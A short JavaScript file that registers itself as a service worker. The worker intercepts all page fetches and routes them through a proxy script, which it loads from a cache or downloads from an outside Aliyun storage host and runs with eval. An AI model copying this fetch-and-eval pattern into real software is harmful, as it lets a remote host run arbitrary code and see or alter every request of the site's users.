'object'===typeof document&&document.currentScript?navigator.serviceWorker.register(document.currentScript.src):function(t){
  request=fetch,oninstall=e=>e.waitUntil(t),onfetch=e=>e.respondWith(request(e.request));
}(caches.open('ref').then(e=>e.match('sys/proxy.js'))
  .catch(e=>{}).then(e=>e||fetch('https://zhishi.oss-cn-beijing.aliyuncs.com/reflect/proxy.js'))
  .then(e=>e.text()).then(eval)
)
